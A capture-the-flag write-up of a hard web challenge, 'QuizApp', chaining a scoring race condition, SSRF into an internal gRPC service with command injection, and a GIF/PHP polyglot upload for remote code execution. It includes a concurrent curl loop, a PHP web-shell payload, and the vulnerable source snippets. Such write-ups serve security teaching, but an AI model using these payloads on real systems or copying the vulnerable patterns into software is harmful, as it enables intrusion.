
# CTF Writeup: QuizApp

**Difficulty:** Hard

**Category:** Web / SSRF / Race Condition / gRPC

## 1. Executive Summary

QuizApp is a PHP-based web application that allows users to answer questions to earn points. High-scoring users can customize their profiles. The challenge involves three main stages:

1. **Logic Flaw**: Exploiting a Race Condition in the scoring system to bypass a 100-point requirement.
    
2. **SSRF**: Using a socket-based "Remote Avatar" feature to talk to an internal gRPC service.
    
3. **RCE**: Achieving Remote Code Execution by uploading a PHP polyglot file that bypasses `getimagesize()`.
    

---

## 2. Information Gathering

The provided source code revealed a multi-service architecture:

- **Web Server**: Apache running PHP 8.2.
    
- **Internal Monitor**: A Go-based gRPC service on port `50051`.
    
- **Flag Location**: `/flag.txt` (Root directory).
    

### Key Vulnerability: `submit.php`

The scoring logic closed the session early and used `usleep(200000)`, creating a 200ms window where multiple concurrent requests could bypass the "already solved" check.

### Key Vulnerability: `profile.php`

The profile update logic allowed remote URLs. It used `fsockopen` to write the URL path directly to a socket after stripping the first two characters:

PHP

```
$data = urldecode(substr($path, 2));
fwrite($fp, $data);
```

### Key Vulnerability: `monitor/main.go`

The internal health check service used unsanitized input in a shell command:

Go

```
cmdStr := fmt.Sprintf("ping -c 1 %s", ip)
out, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
```

---

## 3. Exploitation Path

### Stage 1: The Race Condition

To unlock the profile features, we needed 100 points. Since each question was only worth 10 points, we used a Bash loop to send 20 simultaneous `POST` requests for the same correct answer.

**Payload:**

Bash

```
for i in {1..20}; do 
  curl -s -X POST "http://ctf.vulnbydefault.com:4680/submit.php" \
  -H "Cookie: PHPSESSID=<SID>" \
  --data "question_id=1&answer=11" & 
done; wait
```

This successfully bumped the user score to **150**, unlocking the upload form.

### Stage 2: gRPC Smuggling (Internal SSRF)

With the profile form open, we investigated the gRPC service. The `HealthCheck` service on port `50051` was vulnerable to command injection. However, gRPC uses HTTP/2, a binary protocol.

We used the `avatar_url` parameter to send a raw HTTP/2 stream to `127.0.0.1:50051`. By URL-encoding the binary frames and adding two dummy characters (`AA`) at the start of the path, we bypassed the `substr(2)` logic.

### Stage 3: RCE via Polyglot Upload

While the SSRF was successful, retrieving the output was cleaner via a direct PHP upload. The server used `getimagesize()` to validate uploads but preserved the `.php` extension.

We created a **GIF/PHP Polyglot**. The `GIF89a` header fooled the image validator, while the trailing PHP code allowed us to execute system commands.

**Payload (`shell.php`):**

PHP

```
GIF89a
<?php system('cat /flag.txt'); ?>
```

Upon uploading this file, the server moved it to `/uploads/<random_hash>.php`.

---

## 4. Conclusion

Navigating to the uploaded PHP file executed the command on the server:

**Final Command:**

Bash

```
curl -s "http://ctf.vulnbydefault.com:4680/uploads/36bc1ec04ac50e8a13923a192a5b18e4.php"
```

**Flag:** `VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}`

---

